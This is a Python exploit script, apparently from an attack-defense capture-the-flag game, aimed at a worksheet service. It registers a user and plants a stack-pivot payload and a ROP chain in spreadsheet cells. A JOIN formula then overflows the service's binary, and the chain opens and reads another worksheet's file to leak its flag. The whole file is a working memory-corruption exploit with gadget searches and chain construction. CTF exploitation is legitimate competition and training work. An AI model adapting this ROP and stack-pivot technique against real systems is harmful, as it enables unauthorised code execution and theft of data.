#!/usr/bin/env python3
from chall import Challenge
import random, string, sys
from pwn import *

def rand_str(length: int = 10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def exploit(ip, flag_id):
    ch = Challenge(f'{ip}:8000')
    username = rand_str()
    passwd = rand_str()

    r = ch.register(username, passwd)
    r = ch.login(username, passwd)
    wkst = ch.create_worksheet("lemaokek", False)

    elfname = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'processor')
    elf = ELF(elfname, checksec=False)
    context.binary = elf

    try:
        # asm("mov rsp, rsi; ret")
        mov_rsp_rsi = next(elf.search(bytes.fromhex("4889f4c3"), executable=True))

        # asm("pop rsi; ret")
        pop_rsi = next(elf.search(bytes.fromhex("5ec3"), executable=True))

        # asm("pop rdi; pop rdx; pop rsi; ret")
        pop_rdi_rdx_rsi = next(elf.search(bytes.fromhex("5f5a5ec3"), executable=True))

        # asm("pop rdx; pop rsi; ret")
        pop_rdx_rsi = next(elf.search(bytes.fromhex("5a5ec3"), executable=True))

        # asm("ret")
        ret = next(elf.search(bytes.fromhex("c3"), executable=True))
    except StopIteration:
        print("missing gadgets")
        sys.exit(1)

    stack_pivot_addr = elf.sym['g_worksheet'] + (8+64+8)*64 + 8
    wkst_name_ptr = elf.sym['g_worksheet'] + (8+64+8)*4 + 8
    flag_read_addr = elf.sym['g_worksheet'] + 1000

    payload = b''
    payload += b'\x11'*8 
    payload += p64(0x400000) # random readable addr
    payload += p32(0) + p32(80) # random i > loop cnter
    payload += b'\x44'*8
    payload += b'\x55'*8
    # start of rop
    payload += p64(pop_rsi) # pop rsi; ret
    payload += p64(stack_pivot_addr) # rsi 
    payload += p64(mov_rsp_rsi) # mov rsp, rsi; ret
    assert(len(payload) <= 64)

    ropchain = b''

    ropchain += p64(pop_rdi_rdx_rsi)
    ropchain += p64(wkst_name_ptr) #rdi
    ropchain += p64(0)#rdx
    ropchain += p64(0)#rsi
    ropchain += p64(elf.sym['open'])
    ropchain += p64(ret)
    ropchain += p64(ret)
    ropchain += p64(pop_rdx_rsi) # PAD

    ropchain += p64(pop_rdi_rdx_rsi)
    ropchain += p64(4) # rdi - fd
    ropchain += p64(2+3+64) # rdx - read sz
    ropchain += p64(flag_read_addr) # rsi - read ptr
    ropchain += p64(elf.sym['read'])
    ropchain += p64(ret)
    ropchain += p64(ret)
    ropchain += p64(pop_rdx_rsi) # PAD

    ropchain += p64(pop_rdi_rdx_rsi)
    ropchain += p64(64) # rdi - success sz
    ropchain += p64(0) # rdx
    ropchain += p64(flag_read_addr+2+3) #rsi - data ptr
    ropchain += p64(elf.sym['success'])

    assert(payload[0] != b"=")
    assert(ropchain[:64*1][0] != b"=")
    assert(ropchain[64*1:64*2][0] != b"=")
    assert(ropchain[64*2:][0] != b"=")

    cells = [
        {'x': 0, 'y': 0, 'content': payload.hex()},
        {'x': 1, 'y': 0, 'content': ropchain[:64*1].hex()},
        {'x': 1, 'y': 1, 'content': ropchain[64*1:64*2].hex()},
        {'x': 1, 'y': 2, 'content': ropchain[64*2:].hex()},
        {'x': 0, 'y': 4, 'content': (b"/worksheets/" + flag_id.encode()).hex()},
        {'x': 0, 'y': 5, 'content': b"=JOIN(C1:C64, A1)".hex()},
    ]

    wkst = ch.save_worksheet(wkst['id'], cells)
    for cell in wkst['cells']:
        if cell['x'] == 0 and cell['y'] == 5:
            flag = bytes.fromhex(cell['evaluated']).rstrip(b"\x00").decode()
        
    x = re.search("^[A-Z0-9]{31}=$", flag)
    if x:
        return flag
    else:
        print("nope:", flag)
    exit(1)

if __name__ == "__main__":
    ip = sys.argv[1]
    flag_id = sys.argv[2]
    print(exploit(ip, flag_id))
